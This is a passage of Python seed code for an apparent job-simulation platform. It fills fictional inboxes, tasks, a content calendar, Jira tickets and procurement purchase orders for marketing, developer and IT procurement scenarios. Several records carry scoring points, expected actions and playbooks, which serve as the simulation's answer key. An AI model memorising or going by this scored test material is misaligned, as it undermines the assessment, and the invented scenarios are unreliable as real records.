        {"id":"cc_002","date":"2026-05-07","channel":"Email","asset_type":"newsletter","title":"May newsletter — final draft","status":"awaiting_review","assignee":"you","campaign_id":"camp_004"},
        {"id":"cc_003","date":"2026-05-08","channel":"Email","asset_type":"newsletter","title":"May newsletter — send","status":"scheduled","assignee":"you","campaign_id":"camp_004"},
        {"id":"cc_004","date":"2026-05-09","channel":"On-site","asset_type":"banner","title":"GDPR consent banner update","status":"flagged","assignee":"you","campaign_id":"camp_008"},
        {"id":"cc_005","date":"2026-05-10","channel":"LinkedIn","asset_type":"post","title":"NovaTech v2 launch — hero post","status":"scheduled","assignee":"you","campaign_id":"camp_001"},
        {"id":"cc_006","date":"2026-05-10","channel":"Twitter","asset_type":"thread","title":"NovaTech v2 launch — 5-tweet thread","status":"draft","assignee":"you","campaign_id":"camp_002"},
        {"id":"cc_007","date":"2026-05-10","channel":"Instagram","asset_type":"reel","title":"NovaTech v2 launch — 30s reel","status":"draft","assignee":cfg["teammate"]["name"],"campaign_id":"camp_003"},
        {"id":"cc_008","date":"2026-05-12","channel":"TikTok","asset_type":"creator_post","title":"@MayaCreates — POV launch","status":"awaiting_creator","assignee":"creator","campaign_id":"camp_006"},
        {"id":"cc_009","date":"2026-05-13","channel":"YouTube","asset_type":"creator_post","title":"@sam.builds — long-form review","status":"draft_in_review","assignee":"creator","campaign_id":"camp_006"},
        {"id":"cc_010","date":"2026-05-14","channel":"LinkedIn","asset_type":"case_study","title":"Acme Co — case study","status":"draft","assignee":cfg["teammate"]["name"],"campaign_id":None},
        {"id":"cc_011","date":"2026-05-15","channel":"Email","asset_type":"campaign","title":"Post-launch nurture sequence — Day 1","status":"draft","assignee":"you","campaign_id":"camp_001"},
        {"id":"cc_012","date":"2026-05-16","channel":"LinkedIn","asset_type":"post","title":"Founder POV — why we built v2","status":"draft","assignee":cfg["director"]["name"],"campaign_id":"camp_001"},
        {"id":"cc_013","date":"2026-05-19","channel":"Webinar","asset_type":"event","title":"NovaTech v2 walkthrough","status":"scheduled","assignee":cfg["manager"]["name"],"campaign_id":"camp_001"},
        {"id":"cc_014","date":"2026-05-21","channel":"Email","asset_type":"campaign","title":"Post-launch nurture sequence — Day 7","status":"draft","assignee":"you","campaign_id":"camp_001"},
    ]
    if tools_col is not None:
        # Reuse the generic tools_col so we don't introduce a new collection.
        tools_col.delete_many({"simulation_id":_sim,"name":"Content Calendar"})
        tools_col.insert_one({
            "tool_id":f"tl_cc_{_sim}","simulation_id":_sim,"scenario_id":None,
            "name":"Content Calendar","tool_type":"calendar","icon":"📅","tint":"#0D9488",
            "category":"marketing","data":{"items":calendar},"actions_log":[],
            "created_at":datetime.utcnow().isoformat(),
        })
    if not list(system_events_col.find({"simulation_id":_sim,"tool":"campaigns"}).limit(1)):
        system_events_col.insert_one({"id":"ev_mkt1","simulation_id":_sim,"type":"outage","tool":"campaigns","trigger_at":8,"end_at":11,"start_msg":"Hootsuite is experiencing an outage. Social media scheduling is temporarily unavailable.","end_msg":"Hootsuite is back. Your scheduled posts are intact.","points_for_report":5,"triggered":False,"resolved":False})

def seed_marketing(cfg):
    emails_col.insert_many([
        {"id":"e1","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Welcome! Product launch campaign briefing","body":f"Welcome to {cfg['company']}! We're launching NovaTech's new product next week. I need you to:\n\n1. Draft 3 social media posts (LinkedIn, Twitter, Instagram)\n2. Review the content calendar for next week\n3. Prepare the email newsletter draft\n\nThe brand guidelines are in the shared drive. NovaTech is very particular about their tone — professional but approachable.\n\nDeadline: social posts by 3pm today, newsletter draft by tomorrow.\n\n{cfg['manager']['name']}","time":"09:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e2","simulation_id":sim_id(),"from_name":cfg["client"]["name"],"from_role":cfg["client"]["role"],"from_email":cfg["client"]["email"],"to":"marketing@brightpath.co","subject":"UPDATED brand guidelines — please use new colours","body":"Hi team,\n\nWe've just updated our brand guidelines. The primary colour is now Deep Teal (#0D9488) instead of Navy. Please update all campaign materials accordingly. The new guidelines PDF is attached.\n\nAlso, we've decided the tone should be more 'bold and innovative' rather than 'professional and approachable'. Sorry for the late change.\n\nThanks,\nNovaTech Marketing","time":"10:00","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
        {"id":"e3","simulation_id":sim_id(),"from_name":"HR Team","from_role":"HR","from_email":"hr@brightpath.co","to":"you","subject":"Onboarding tasks","body":"Welcome! Please complete:\n1. Read social media policy\n2. Set up Hootsuite access\n3. Review brand book\n4. Complete GDPR marketing training\n\nEmployee ID: BP-0392","time":"08:45","read":False,"replied":False,"priority":"medium","category":"onboarding","requires_action":True},
        {"id":"e4","simulation_id":sim_id(),"from_name":cfg["it"]["name"],"from_role":cfg["it"]["role"],"from_email":cfg["it"]["email"],"to":"you","subject":"Tool access ready","body":f"Hi, your accounts:\n- Hootsuite: configured\n- Canva Pro: team access\n- Google Analytics: viewer\n- Slack: #marketing channel\n\n{cfg['it']['name']}","time":"08:30","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
        {"id":"e5","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Analytics report needed","body":"Oh also — can you pull the engagement metrics from last month's campaign? Lisa (the CEO) wants to see the ROI numbers in tomorrow's board meeting.\n\nThe data is in Google Analytics and Hootsuite. Template is in the shared drive.\n\nLisa","time":"10:30","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
        {"id":"e6","simulation_id":sim_id(),"from_name":cfg["teammate"]["name"],"from_role":cfg["teammate"]["role"],"from_email":cfg["teammate"]["email"],"to":"you","subject":"Sharing brand v2 assets — use these","body":f"Welcome!\n\nHeads up — we got the new NovaTech v2 logo lockup and colour swatches yesterday. Don't pull from the old shared drive folder, half of it's the navy version. Use the v2 folder. The teal is #0D9488, secondary is #F59E0B.\n\nIf you draft posts, ping me and I'll review before they go live. Faster than learning by getting the client annoyed at us.\n\n{cfg['teammate']['name'].split()[0]}","time":"09:45","read":False,"replied":False,"priority":"medium","category":"teammate","requires_action":False},
        {"id":"e7","simulation_id":sim_id(),"from_name":cfg["director"]["name"],"from_role":cfg["director"]["role"],"from_email":cfg["director"]["email"],"to":"marketing@brightpath.co","subject":"Q2 budget — need numbers by Wednesday","body":f"Team,\n\nI'm pitching Q2 to the board next Friday. I need:\n• Channel-level spend forecast (paid social / SEO / events / content)\n• Projected lead volume by channel\n• Two scenarios: 100% budget and 70% budget\n\n{cfg['manager']['name'].split()[0]}, please pull the new starter into this — good way to learn how we plan.\n\n{cfg['director']['name']}","time":"10:45","read":False,"replied":False,"priority":"high","category":"info","requires_action":False},
        {"id":"e8","simulation_id":sim_id(),"from_name":"Influencer Booking","from_role":"Partnerships Inbox","from_email":"partnerships@brightpath.co","to":"you","subject":"3 creators want NovaTech briefs","body":"Hi,\n\nThree creators replied to our outreach for the NovaTech launch — all in ICP, all under-£3k:\n\n• @MayaCreates — TikTok, 240k followers, tech-lifestyle, £2,400\n• @sam.builds — YouTube, 92k subs, deep-tech reviews, £2,800\n• @arianaonline — Instagram, 410k followers, lifestyle, £1,900\n\nPlease shortlist 2 and send a brief by tomorrow. Forward your picks back to me.\n\nPartnerships","time":"11:00","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
    ])
    tasks_col.insert_many([
        {"id":"t1","simulation_id":sim_id(),"title":"Complete onboarding","description":"Social media policy, Hootsuite, brand book, GDPR training","priority":"medium","deadline":"12:00","status":"pending","points":10},
        {"id":"t2","simulation_id":sim_id(),"title":"Draft 3 social media posts","description":"LinkedIn, Twitter, Instagram for NovaTech product launch","priority":"high","deadline":"15:00","status":"pending","points":35},
        {"id":"t3","simulation_id":sim_id(),"title":"Update materials with new brand guidelines","description":"NovaTech changed colours and tone. Update all drafts.","priority":"high","deadline":"14:00","status":"pending","points":25},
        {"id":"t4","simulation_id":sim_id(),"title":"Prepare email newsletter draft","description":"Product launch newsletter for NovaTech","priority":"medium","deadline":"tomorrow","status":"pending","points":15},
        {"id":"t5","simulation_id":sim_id(),"title":"Pull last month's engagement analytics","description":"Google Analytics + Hootsuite metrics for board meeting","priority":"medium","deadline":"tomorrow","status":"pending","points":15},
        {"id":"t6","simulation_id":sim_id(),"title":"Shortlist 2 creators + send briefs","description":"Pick 2 of @MayaCreates / @sam.builds / @arianaonline. Brief by tomorrow.","priority":"medium","deadline":"tomorrow","status":"pending","points":20},
        {"id":"t7","simulation_id":sim_id(),"title":"Pull Q2 channel-level spend forecast","description":"Director needs paid social / SEO / events / content split, 100% and 70% scenarios.","priority":"high","deadline":"Wednesday","status":"pending","points":25},
        {"id":"t8","simulation_id":sim_id(),"title":"Schedule social posts in Hootsuite","description":"Once posts are approved, schedule across LinkedIn / Twitter / Instagram for launch day.","priority":"medium","deadline":"tomorrow","status":"pending","points":15},
        {"id":"t9","simulation_id":sim_id(),"title":"Send weekly metrics summary","description":"One-page email to manager: top post, CTR, reach, anomalies.","priority":"medium","deadline":"Friday","status":"pending","points":10},
    ])
    _seed_marketing_artifacts(cfg)

def _seed_developer_artifacts(cfg):
    """Career-specific Jira/CI data. Idempotent per simulation_id."""
    _sim = sim_id()
    teammate = cfg["teammate"]["name"]
    manager = cfg["manager"]["name"]
    client = cfg["client"]["name"]
    director = cfg["director"]["name"]
    tickets = [
        {"id":"BUG-301","type":"bug","title":"Login page crashes on mobile Safari","priority":"HIGH","status":"in_progress","assignee":"you","reporter":teammate,"sprint":"Sprint-47","story_points":3,"labels":["safari","auth","release-blocker"],"component":"auth",
         "description":"Users on Safari iOS 17+ get a white screen when clicking 'Login with Google'. Console shows: TypeError: Cannot read property 'viewport' of undefined. Affects ~15% of mobile users. Discovered in v2.3.1 release on 2026-04-28.",
         "steps_to_reproduce":"1. Open app on Safari iOS 17+\n2. Click 'Login with Google'\n3. White screen appears","expected":"OAuth popup should appear","actual":"White screen, JS TypeError",
         "root_cause":"Unknown — likely CSS viewport or OAuth SDK regression",
         "comments":[
            {"author":teammate,"ts":"2026-04-29T09:14","text":"I think it's the viewport meta tag. The CSS calc() is failing on Safari 17."},
            {"author":"Mike Chen","ts":"2026-04-29T10:02","text":"Disagree — more likely the OAuth SDK 5.4 update. Safari 17 changed popup behaviour."},
            {"author":manager,"ts":"2026-04-29T11:30","text":"Need this fixed before Friday release. @you please own."},
            {"author":"you","ts":"2026-04-30T08:45","text":"Reproduced locally. Looking at SDK changelog now."},
         ],
         "linked_prs":[{"id":"PR-1284","title":"fix(auth): handle Safari 17 popup blocker","branch":"fix/BUG-301-safari-popup","status":"draft","ci_status":"failing","author":"you","created":"2026-04-30"}],
         "test_results":{"unit":{"total":142,"pass":140,"fail":2,"skip":0},"integration":{"total":38,"pass":35,"fail":3,"skip":0},"e2e":{"total":12,"pass":11,"fail":1,"skip":0}},
         "deployment_history":[{"env":"staging","version":"2.3.1-rc.4","ts":"2026-04-28T14:02","status":"failed","note":"Same Safari error in staging"}],
         "created_at":"2026-04-28T16:40","updated_at":"2026-04-30T08:45"},
        {"id":"BUG-287","type":"bug","title":"Profile image returns 403 from S3","priority":"MEDIUM","status":"open","assignee":"you","reporter":"QA Bot","sprint":"Sprint-47","story_points":2,"labels":["s3","cdn","user-service"],"component":"user-service",
         "description":"User profile images show broken-image icon. S3 URL returns 403 Forbidden. Likely a bucket policy change from last week's infra update by DevOps.",
         "steps_to_reproduce":"1. Sign in\n2. Open profile page\n3. Avatar shows broken icon","expected":"Avatar image renders","actual":"403 from S3 CDN",
         "comments":[
            {"author":"QA Bot","ts":"2026-04-29T07:00","text":"Reproduced on prod & staging. Direct S3 GET also 403."},
            {"author":"DevOps (Priya)","ts":"2026-04-29T13:15","text":"We rotated the bucket policy on Apr 22. Public-read on user-avatars/* should still work — checking."},
         ],
         "linked_prs":[],"test_results":{"unit":{"total":58,"pass":58,"fail":0,"skip":0}},
         "deployment_history":[],
         "created_at":"2026-04-29T07:00","updated_at":"2026-04-29T13:15"},
        {"id":"BUG-312","type":"bug","title":"Memory leak in dashboard charts","priority":"HIGH","status":"open","assignee":"you","reporter":"Mike Chen","sprint":"Sprint-47","story_points":5,"labels":["performance","memory-leak","frontend"],"component":"frontend/charts",
         "description":"Heap snapshot shows ~80MB growth after 10 minutes on the dashboard. Chart.js instances are not being destroyed on route change. Browser tab eventually crashes on lower-memory machines.",
         "steps_to_reproduce":"1. Open dashboard\n2. Toggle between 5 chart views repeatedly\n3. Heap snapshot every 2 min","expected":"Stable heap","actual":"+8MB per cycle, never freed",
         "comments":[
            {"author":"Mike Chen","ts":"2026-04-29T16:20","text":"`useEffect` cleanup is missing in ChartPanel. Easy fix — call chart.destroy()."},
            {"author":"you","ts":"2026-04-30T09:10","text":"Picking up after BUG-301."},
         ],
         "linked_prs":[],"test_results":{},
         "deployment_history":[],
         "created_at":"2026-04-29T16:20","updated_at":"2026-04-30T09:10"},
        {"id":"BUG-298","type":"bug","title":"Race condition in payment webhook handler","priority":"CRITICAL","status":"in_review","assignee":teammate,"reporter":"PagerDuty","sprint":"Sprint-47","story_points":8,"labels":["payments","stripe","data-integrity","p1"],"component":"payments",
         "description":"P1 incident 2026-04-26. Stripe webhook 'charge.succeeded' arrives twice within 50ms; both handlers attempt to credit the user wallet → double-credit on 14 transactions (~£18,200 total exposure). Idempotency key check is currently after the credit call.",
         "steps_to_reproduce":"Stripe Test Mode → fire charge.succeeded twice with same event_id within 100ms","expected":"Second call short-circuits","actual":"Both calls credit wallet",
         "root_cause":"Idempotency check uses cache lookup instead of DB unique constraint; cache miss under concurrency.",
         "comments":[
            {"author":"PagerDuty","ts":"2026-04-26T03:14","text":"P1 fired — wallet_credits anomaly threshold exceeded."},
            {"author":director,"ts":"2026-04-26T08:00","text":"Postmortem owner: @"+teammate+". 48h deadline."},
            {"author":teammate,"ts":"2026-04-29T11:00","text":"PR-1281 ready for review. Adds DB unique constraint on (event_id, handler) and moves idempotency check inside transaction."},
            {"author":"you","ts":"2026-04-30T08:50","text":"Reviewed — LGTM modulo the migration rollback note."},
         ],
         "linked_prs":[{"id":"PR-1281","title":"fix(payments): idempotency via DB unique constraint","branch":"fix/BUG-298-idempotency","status":"in_review","ci_status":"passing","author":teammate,"created":"2026-04-28"}],
         "test_results":{"unit":{"total":312,"pass":312,"fail":0,"skip":0},"integration":{"total":74,"pass":74,"fail":0,"skip":0},"e2e":{"total":8,"pass":8,"fail":0,"skip":0}},
         "deployment_history":[{"env":"staging","version":"2.3.2-rc.1","ts":"2026-04-29T17:30","status":"passed","note":"Soak test 12h, no double credits"}],
         "created_at":"2026-04-26T03:14","updated_at":"2026-04-30T08:50"},
        {"id":"FEAT-156","type":"feature","title":"Dark mode toggle (scope-expanded)","priority":"MEDIUM","status":"open","assignee":"you","reporter":client,"sprint":"Sprint-48","story_points":13,"labels":["ux","theming","client-promised"],"component":"frontend",
         "description":"Original scope: Add toggle in settings.\n\nUPDATED SCOPE (2026-04-29 by Product):\n1. Auto-detect prefers-color-scheme\n2. Persist choice in localStorage\n3. Apply theme to ALL pages, including Chart.js dashboards\n4. Theme variables exposed to white-label tenants\n\nClient promised this in v2.4 — Friday release.",
         "comments":[
            {"author":client,"ts":"2026-04-29T10:00","text":"Sales committed. We need a number tomorrow AM."},
            {"author":"you","ts":"2026-04-30T09:15","text":"Original 4h estimate is dead. Re-estimating with 4 sub-tickets."},
         ],
         "linked_prs":[],"test_results":{},
         "deployment_history":[],
         "original_estimate":"4 hours","revised_estimate":"TBD",
         "created_at":"2026-04-15T10:00","updated_at":"2026-04-30T09:15"},
        {"id":"FEAT-201","type":"feature","title":"Migrate Stripe Checkout v1 → v2","priority":"HIGH","status":"in_progress","assignee":"Mike Chen","reporter":manager,"sprint":"Sprint-47","story_points":13,"labels":["payments","stripe","migration"],"component":"payments",
         "description":"Stripe is sunsetting Checkout v1 on 2026-09-30. Migrate all checkout flows to v2 (PaymentIntents API). Includes: refactor /api/checkout, update webhook handlers to handle 'payment_intent.*' events, update frontend Stripe.js elements.",
         "comments":[
            {"author":manager,"ts":"2026-04-15T09:00","text":"Q2 OKR. Mike owns."},
            {"author":"Mike Chen","ts":"2026-04-29T16:45","text":"Backend done. Frontend Elements integration in progress."},
         ],
         "linked_prs":[{"id":"PR-1276","title":"feat(checkout): switch to PaymentIntents","branch":"feat/FEAT-201-payment-intents","status":"merged","ci_status":"passing","author":"Mike Chen","created":"2026-04-22","merged":"2026-04-26"}],
         "test_results":{"unit":{"total":98,"pass":97,"fail":1,"skip":0},"integration":{"total":24,"pass":23,"fail":1,"skip":0}},
         "deployment_history":[{"env":"staging","version":"2.3.2-rc.0","ts":"2026-04-26T11:00","status":"passed","note":"v2 PaymentIntents working"}],
         "created_at":"2026-04-12T11:00","updated_at":"2026-04-29T16:45"},
        {"id":"FEAT-178","type":"feature","title":"Admin audit-log CSV export","priority":"MEDIUM","status":"open","assignee":"unassigned","reporter":"Compliance","sprint":"Backlog","story_points":5,"labels":["compliance","admin","iso27001"],"component":"admin",
         "description":"ISO 27001 A.12.4.1 — admins must be able to export full audit log (last 90 days) as CSV. Filter by user, action, date range. Streaming response (don't load full table in memory).",
         "comments":[
            {"author":"Compliance","ts":"2026-04-20T14:00","text":"Auditors arrive 2026-05-03. We need this before then."},
         ],
         "linked_prs":[],"test_results":{},"deployment_history":[],
         "created_at":"2026-04-20T14:00","updated_at":"2026-04-20T14:00"},
        {"id":"TASK-045","type":"task","title":"Quarterly dependency upgrades","priority":"MEDIUM","status":"open","assignee":"you","reporter":"Dependabot","sprint":"Sprint-48","story_points":3,"labels":["dependencies","security","maintenance"],"component":"infrastructure",
         "description":"42 dependency updates pending across 6 services. 4 are security advisories (2 HIGH: lodash<4.17.21, axios<1.6.7). Run upgrades, check breaking changes, update lockfiles, run full test suite.",
         "comments":[
            {"author":"Dependabot","ts":"2026-04-28T00:00","text":"Auto-PRs created (PR-1290..1294). Some have merge conflicts."},
         ],
         "linked_prs":[
            {"id":"PR-1290","title":"chore(deps): bump lodash 4.17.20 → 4.17.21","branch":"dependabot/lodash","status":"open","ci_status":"passing","author":"dependabot[bot]","created":"2026-04-28"},
            {"id":"PR-1291","title":"chore(deps): bump axios 1.6.5 → 1.6.7","branch":"dependabot/axios","status":"open","ci_status":"passing","author":"dependabot[bot]","created":"2026-04-28"},
         ],
         "test_results":{},"deployment_history":[],
         "created_at":"2026-04-28T00:00","updated_at":"2026-04-29T09:00"},
        {"id":"CHORE-091","type":"chore","title":"Migrate Yarn → pnpm","priority":"LOW","status":"blocked","assignee":teammate,"reporter":teammate,"sprint":"Backlog","story_points":8,"labels":["tooling","ci","blocked"],"component":"tooling",
         "description":"Yarn 1.x is unmaintained. Move to pnpm for faster installs (3.2x in benchmarks) and stricter peer-dep handling. Blocked on: nx-monorepo plugin doesn't yet support pnpm v9 (issue nrwl/nx#28104).",
         "comments":[
            {"author":teammate,"ts":"2026-04-10T13:00","text":"Started benchmarking. Install time goes 4m12s → 1m18s."},
            {"author":teammate,"ts":"2026-04-22T10:00","text":"Blocked — nx plugin gap. Tracking upstream."},
         ],
         "linked_prs":[],"test_results":{},"deployment_history":[],
         "blocked_by":"nrwl/nx#28104",
         "created_at":"2026-04-10T13:00","updated_at":"2026-04-22T10:00"},
    ]
    jira_col.delete_many({"simulation_id":_sim})
    for t in tickets:
        t["simulation_id"]=_sim
    jira_col.insert_many(tickets)
    if not list(system_events_col.find({"simulation_id":_sim,"tool":"jira"}).limit(1)):
        system_events_col.insert_many([
            {"id":"ev_jira1","simulation_id":_sim,"type":"outage","tool":"jira","trigger_at":6,"end_at":9,"start_msg":"CI/CD pipeline is failing. All deployments blocked. DevOps is investigating.","end_msg":"Pipeline restored. Root cause: expired Docker Hub credentials.","points_for_report":5,"triggered":False,"resolved":False},
            {"id":"ev_jira2","simulation_id":_sim,"type":"incident","tool":"production","trigger_at":12,"end_at":None,"start_msg":"🚨 PRODUCTION ALERT: API response times spiked to 8s. Users reporting timeouts. This is a P1 incident.","end_msg":None,"points_for_report":10,"triggered":False,"resolved":False},
        ])

def seed_developer(cfg):
    emails_col.insert_many([
        {"id":"e1","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Welcome — here's your first sprint","body":f"Welcome to {cfg['company']}! You're joining mid-sprint. I've assigned you 3 Jira tickets:\n\n1. BUG-301: Login page crashes on mobile Safari (HIGH)\n2. BUG-287: User profile image not loading (MEDIUM)\n3. FEAT-156: Add dark mode toggle to settings (LOW)\n\nStart with BUG-301 — it's blocking the release. The code is in the `auth` module. Check Jira for details.\n\nWe have standup at 10am — be ready to share your plan.\n\n{cfg['manager']['name']}","time":"09:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e2","simulation_id":sim_id(),"from_name":cfg["client"]["name"],"from_role":cfg["client"]["role"],"from_email":cfg["client"]["email"],"to":"engineering@codecraft.dev","subject":"URGENT: Change in requirements for FEAT-156","body":"Hi Engineering,\n\nThe dark mode feature needs to be more than a toggle. Product has decided it should:\n1. Auto-detect system preference\n2. Remember user choice in localStorage\n3. Apply to ALL pages including the dashboard charts\n\nI know this is bigger than originally scoped. But we promised the client it would be in v2.4. Can we still hit the Friday release?\n\nThanks,\nProduct Team","time":"10:00","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
        {"id":"e3","simulation_id":sim_id(),"from_name":"HR Team","from_role":"HR","from_email":"hr@codecraft.dev","to":"you","subject":"Developer onboarding","body":"Welcome! Complete today:\n1. Set up Git SSH keys\n2. Clone the monorepo\n3. Read the contributing guide\n4. Complete code of conduct acknowledgment\n\nBadge: CC-2847","time":"08:45","read":False,"replied":False,"priority":"medium","category":"onboarding","requires_action":True},
        {"id":"e4","simulation_id":sim_id(),"from_name":cfg["it"]["name"],"from_role":cfg["it"]["role"],"from_email":cfg["it"]["email"],"to":"you","subject":"Dev environment ready","body":f"Your dev env is set up:\n- GitHub: team access granted\n- Jira: dev board access\n- Slack: #engineering\n- CI/CD: read access to pipelines\n\n{cfg['it']['name']}","time":"08:30","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
        {"id":"e5","simulation_id":sim_id(),"from_name":cfg["teammate"]["name"],"from_role":cfg["teammate"]["role"],"from_email":cfg["teammate"]["email"],"to":"you","subject":"QA found issues with your approach","body":"Hi,\n\nI saw you picked up BUG-301. Just a heads up — last time someone tried to fix the Safari login crash, they broke the OAuth flow on Chrome. Please make sure you test across all browsers before submitting the PR.\n\nAlso, I think the root cause is in the CSS viewport meta tag, not the JavaScript. But Mike thinks it's a JS issue. Up to you.\n\nAisha","time":"09:30","read":False,"replied":False,"priority":"medium","category":"teammate","requires_action":False},
        {"id":"e6","simulation_id":sim_id(),"from_name":"CI Bot","from_role":"Continuous Integration","from_email":"ci@codecraft.dev","to":"you","subject":"[CI] main is red — auth-tests flaky","body":"Hi,\n\n3 of the last 5 runs on `main` failed at:\n  auth.test.ts › OAuth flow › popup opens on Safari\n\nIntermittent — passes on retry. Likely race condition or timing-dependent test. Test owner: you (per CODEOWNERS).\n\nLink: https://ci.codecraft.dev/runs/main/3471\n\nCI Bot","time":"09:50","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e7","simulation_id":sim_id(),"from_name":cfg["director"]["name"],"from_role":cfg["director"]["role"],"from_email":cfg["director"]["email"],"to":"engineering@codecraft.dev","subject":"Postmortem template — for any P1 you touch","body":f"All,\n\nWhen we hit a P1, I want a written postmortem within 48 hours. Use the template in /docs/postmortem.md. Sections:\n• Timeline\n• Root cause (5-whys)\n• What worked\n• What didn't\n• Action items with owners + due dates\n\nNew starters: own the doc end-to-end if you touched the incident. Best way to learn the codebase fast.\n\n{cfg['director']['name']}","time":"10:45","read":False,"replied":False,"priority":"medium","category":"info","requires_action":False},
        {"id":"e8","simulation_id":sim_id(),"from_name":cfg["client"]["name"],"from_role":cfg["client"]["role"],"from_email":cfg["client"]["email"],"to":"you","subject":"Estimate for FEAT-156 v2 — when?","body":"Hi,\n\nFollowing on from the scope change — when will we have a revised estimate for the dark-mode feature? Sales is asking what to tell the client. I can hold them off until tomorrow morning but I need a number, even rough.\n\nThanks,\nProduct","time":"11:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
    ])
    tasks_col.insert_many([
        {"id":"t1","simulation_id":sim_id(),"title":"Complete developer onboarding","description":"SSH keys, clone repo, contributing guide, code of conduct","priority":"medium","deadline":"11:00","status":"pending","points":10},
        {"id":"t2","simulation_id":sim_id(),"title":"Fix BUG-301: Safari login crash","description":"HIGH priority. Blocking release. Auth module.","priority":"high","deadline":"14:00","status":"pending","points":40},
        {"id":"t3","simulation_id":sim_id(),"title":"Fix BUG-287: Profile image not loading","description":"MEDIUM priority. Broken image URL in user service.","priority":"medium","deadline":"17:00","status":"pending","points":15},
        {"id":"t4","simulation_id":sim_id(),"title":"Scope FEAT-156: Dark mode (expanded)","description":"Requirements changed. Scope the expanded feature.","priority":"high","deadline":"15:00","status":"pending","points":20},
        {"id":"t5","simulation_id":sim_id(),"title":"Prep for 10am standup","description":"Share your plan for the sprint tickets.","priority":"medium","deadline":"10:00","status":"pending","points":10},
        {"id":"t6","simulation_id":sim_id(),"title":"Investigate flaky auth-tests on main","description":"3 of last 5 runs failed on Safari OAuth popup test. Find race condition.","priority":"high","deadline":"15:00","status":"pending","points":20},
        {"id":"t7","simulation_id":sim_id(),"title":"Send revised FEAT-156 estimate to Product","description":"Hours, blockers, risks. Even rough — Product needs a number by tomorrow AM.","priority":"high","deadline":"tomorrow","status":"pending","points":15},
        {"id":"t8","simulation_id":sim_id(),"title":"Open PR for BUG-301","description":"Once fix is verified, open PR, request review from teammate, link Jira.","priority":"high","deadline":"16:00","status":"pending","points":15},
        {"id":"t9","simulation_id":sim_id(),"title":"Write postmortem if any P1 fired today","description":"Use /docs/postmortem.md template. Timeline, root cause, action items.","priority":"medium","deadline":"tomorrow","status":"pending","points":15},
    ])
    _seed_developer_artifacts(cfg)

def _seed_procurement_artifacts(cfg):
    """IT Procurement — PO approval kanban + vendor catalog table + contract renewals.
    Idempotent per simulation_id. Uses generic tools_col so the existing kanban/table
    renderers on the frontend pick these up automatically."""
    _sim = sim_id()
    teammate = cfg["teammate"]["name"]
    manager = cfg["manager"]["name"]
    director = cfg["director"]["name"]
    requester = cfg["client"]["name"]
    # ── Purchase Orders (kanban) ──────────────────────────────
    po_cards = [
        {"id":"PO-2410","title":"Cursor Pro for Teams — 24 seats","vendor":"Cursor (Anysphere Inc.)","category":"AI dev tooling","amount_gbp":7920,"currency":"GBP","term":"annual","requester":"Marcus Hale (Eng Manager)","cost_center":"ENG-PLATFORM",
         "column":"escalation","expected_column":"in_review","priority":"HIGH","risk_flags":["paid_on_personal_card","no_security_review","no_dpa"],
         "summary":"Marcus paid £660 with his personal Amex on 6 May for a single seat to test, then committed his team verbally. Now wants 24-seat upgrade backdated. No security review, no DPA, no MSA. AI tool — touches source code.",
         "created":"2026-05-09T08:14","sla_hours":24,"correct_action":"reject_and_route","points":25,
         "playbook":["Reimburse Marcus's £660 via expense, NOT a backdated PO","Pause team rollout until SOC 2 + DPA on file","Open vendor security review (vendor_id=cursor-001)","Once approved, issue formal PO with annual term, MSA, DPA","Email Marcus + cc Helena: explain the policy, not the person"]},
        {"id":"PO-2411","title":"Datadog Pro — 200 hosts (renewal)","vendor":"Datadog Inc.","category":"Observability","amount_gbp":148000,"currency":"GBP","term":"3yr",
         "requester":"Olu Adesina (Procurement)","cost_center":"INFRA","column":"in_review","expected_column":"in_review","priority":"HIGH",
         "risk_flags":["multi_year_lock_in","price_increase_18pct"],
         "summary":"Renewal due 2026-05-31. Vendor offering 18% increase on 1yr or flat on 3yr. Olu thinks 3yr is fine. Helena wants you to check usage data — we've been over-provisioned by ~30 hosts for 6 months.",
         "created":"2026-05-04T11:00","sla_hours":96,"correct_action":"renegotiate","points":20,
         "playbook":["Pull 6-month usage from Datadog admin","Right-size to ~165 hosts","Counter at 1yr flat OR 3yr -8% with right-sized commit","Get CFO sign-off on multi-year"]},
        {"id":"PO-2412","title":"Snyk Enterprise — code & container scanning","vendor":"Snyk Ltd.","category":"AppSec","amount_gbp":42000,"currency":"GBP","term":"annual",
         "requester":"Priya Nair (Security Lead)","cost_center":"SECURITY","column":"pending_approval","expected_column":"pending_approval","priority":"MEDIUM",
         "risk_flags":["security_review_open_14_days"],
         "summary":"Security review opened 25 Apr — still open. Vendor has SOC 2 Type II, ISO 27001. DPA signed. Just needs final CFO approval. Priya is escalating because budget freezes Friday.",
         "created":"2026-04-22T09:30","sla_hours":48,"correct_action":"approve","points":15,
         "playbook":["Verify SOC 2 not expired (current cert ends 2026-12-31)","Confirm DPA references our DPO","Push to CFO with one-line summary","Notify Priya once approved"]},
        {"id":"PO-2413","title":"GitHub Enterprise — 410 seats (renewal)","vendor":"GitHub Inc.","category":"Source control","amount_gbp":98400,"currency":"GBP","term":"annual",
         "requester":"Olu Adesina (Procurement)","cost_center":"ENG-ALL","column":"approved","expected_column":"approved","priority":"MEDIUM",
         "risk_flags":[],"summary":"Standard renewal, flat price, EA terms unchanged. Already CFO-approved. Just needs PO issued.",
         "created":"2026-04-18T10:00","sla_hours":120,"correct_action":"issue","points":10,
         "playbook":["Issue PO via NetSuite","Send to Olu for AP filing"]},
        {"id":"PO-2414","title":"Lattice HRIS — 1-year subscription","vendor":"Lattice Inc.","category":"HR tech","amount_gbp":24800,"currency":"GBP","term":"annual",
